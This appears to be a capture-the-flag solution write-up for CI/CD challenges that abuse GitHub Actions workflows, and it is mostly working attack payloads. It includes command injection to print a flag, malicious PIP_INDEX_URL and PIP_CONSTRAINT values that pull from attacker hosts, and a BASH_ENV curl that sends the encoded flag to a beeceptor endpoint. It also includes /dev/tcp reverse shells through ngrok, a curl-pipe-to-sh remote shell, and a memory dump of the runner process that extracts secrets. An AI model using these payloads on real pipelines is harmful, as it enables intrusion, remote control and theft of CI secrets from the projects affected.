
<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li>
      <a href="#chall 1">Challenge 1</a>
    </li>
    <li>
      <a href="#getting-started">Challenge 2</a>
      <ul>
        <li><a href="#prerequisites">Solution 1</a></li>
        <li><a href="#installation">Solution 2</a></li>
      </ul>
    </li>
    <li>
      <a href="#getting-started">Challenge 2</a>
      <ul>
        <li><a href="#prerequisites">Solution 1</a></li>
        <li><a href="#installation">Solution 2</a></li>
      </ul>
    </li>
  </ol>
</details>

# Chall 1
 
``` bash
Hello, there!'; echo "Here is your flag: ${FLAG}" | base64 ;echo 'General Kenobi
```






# Chall 2
## Solution 1
> [!NOTE]
> - [PIP environment variables doc](https://pip.pypa.io/en/latest/cli/pip_install/) PIP_<UPPER_LONG_NAME>
> - [Pypi PyYAML](https://pypi.org/project/PyYAML/)
> - [Cloudsmith](https://cloudsmith.io/~nebco/packages/)
``` bash
Not a release :(
PIP_INDEX_URL=https://cloudsmith.io/~nebco/packages/#
```
> [!TIP]
> Alternatives to cloudsmith :
> - Host your own registry (local, AWS or other...)
> - Use github pages
>
> Sometimes indentation doesn't work when commenting on an exit. It is therefore preferable to use `Github CLI` directly and push a file. `gh issue comment <id_issue> -F <file_name>`





## Solution 2
> [!NOTE]
> - [Beeceptor](https://beeceptor.com/)
> - [Beeceptor for the demo](https://app.beeceptor.com/console/tdf123456)

Configure Beeceptor :
- Add new "Mocking Rules"
- Match value: "/<file_name>.txt"
- Response body: "pyyaml@https://tdf123456.free.beeceptor.com/${FLAG}%"

``` bash
Not a release :(
PIP_CONSTRAINT=https://tdf123456.free.beeceptor.com/get-flag
```





# Chall 3
## Solution 1
> [!NOTE]
> - [Bash variables doc](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
> - [Beeceptor](https://beeceptor.com/)
> - [Beeceptor for the demo](https://app.beeceptor.com/console/tdf123456)
 
``` bash
Not a release :(
BASH_ENV=$(curl https://tdf123456.free.beeceptor.com?flag=$(echo "$FLAG" | base64))
```





## Solution 2
``` bash
Not a release :(
BASH_FUNC_echo%%=() { builtin echo "coucou $@" | printenv | base64 ;}
```
 




# Chall 4
## Setup (client side)
### Listen with NC

``` bash
nc -lv 4444
```
 
### Setup ngrok
 
``` bash
ngrok tcp 4444
```
 
### Get ngrok IP to build payload
 
``` bash
dig <NGROK_DNS>
```
 
## Payload
 
``` bash
$(bash -i >& /dev/tcp/<NGROK_IP>/<NGROK_PORT> 0>&1)
```
 
## Fancy shell for lazy DevOps :)
 
``` bash
curl -sSf https://sshx.io/get | sh -s run
```
 
## Let's investigate!
 
The directory `/home/runner/work/_temp` look interesting...
 




# Chall 5
 
### Listen with NC

``` bash
nc -lv 4444
```
 
### Setup ngrok
 
``` bash
ngrok tcp 4444
```
 
### Get ngrok IP to build payload
 
``` bash
dig <NGROK_DNS>
```
 
## Payload
 
``` bash
; bash -i >& /dev/tcp/<NGROK_IP>/<NGROK_PORT> 0>&1
```
 
## Fancy shell for lazy DevOps :)
 
``` bash
curl -sSf https://sshx.io/get | sh -s run
```
 
## Let's dump!
 
### Let's check those secrets
 
``` bash
sudo apt-get install -y gdb; sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{print $1}')"; grep -Eao '"[^"]+":\{"value":"[^"]*","isSecret":true\}' k.dump*
```

 
